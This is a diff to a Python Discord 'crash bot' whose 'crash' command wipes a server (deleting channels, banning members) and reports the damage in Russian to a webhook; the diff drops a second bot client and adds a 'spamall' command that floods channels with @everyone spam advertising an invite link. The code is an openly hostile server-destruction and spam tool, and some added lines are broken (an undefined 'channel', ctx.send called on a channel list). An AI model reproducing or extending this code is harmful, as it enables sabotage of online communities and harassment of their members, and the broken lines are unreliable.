@@ -10,9 +10,6 @@ from discord import Webhook, RequestsWebhookAdapter
 client = commands.Bot(command_prefix = settings['PREFIX'], case_insensitive = True, intents = discord.Intents.all())
 client.remove_command('help')
 
-client2 = commands.Bot(command_prefix = 1)
-client2.remove_command('help')
-
 global webhook
 webhook = Webhook.from_url(settings['WEBHOOK'], adapter=RequestsWebhookAdapter())
 
@@ -26,12 +23,9 @@ async def on_ready():
 	await client.change_presence(activity = discord.Game('t!crash | .gg/43GtxcFXPK'))
 	print(f'Bot {client.user.name}#{client.user.discriminator} is ready')
 
-@client2.event
-async def on_ready():
-	await client2.change_presence(activity = discord.Game('Бот онлайн!'))
-
 @client.command()
 async def crash(ctx):
+	ctx.send(channel, "huh :)")
 	print('='*45)
 	start_time = localtime()
 	start_guild_num = len(ctx.guild.members)
@@ -85,8 +79,7 @@ async def crash(ctx):
 	roles_num = 0
 	emojis_num = 0
 	servername = ctx.guild.name
-	servericon = ctx.guild.icon
-	smember = len(ctx.guild.members)
+	servericon = ctx.guild.icon_url
 
 	for x in range(settings['TEXT-CHANNELS']):
 		text_num += 1
@@ -130,7 +123,7 @@ async def crash(ctx):
 	await asyncio.sleep(2)
 	#CRASH REPORT
 	try:
-		emb = discord.Embed(title = 'Новый краш!', description = f"\Сервер: {servername}, иконка: ------->\n\**Участников**: {smember}\n\
+		emb = discord.Embed(title = 'Новый краш!', description = f"\Сервер: {servername}, иконка: ------->\n\**Участников**: {start_guild_num}\n\
 		**Удалено:**\n\
 			**Каналов:** {deleted_chan}/{start_guild_chan_num}\n\
 			**Людей забанено:** {banned_num}/{start_guild_num}\n\
@@ -160,5 +153,12 @@ async def __spam(ctx):
     except:
        break
 
+@client.command(aliases=['spamall'])
+async def __spamall(ctx):
+	for i in range(25):
+		try:
+			ctx.send(ctx.guild.channels, '@everyone S3rv3r crash9d by new crash bot: Destroyer!\n\Ссылка на сервер: https://discord.gg/43GtxcFXPK')
+		except:
+			break
+
 client.run(settings['TOKEN'])
-client2.run(settings['TOKEN2'])
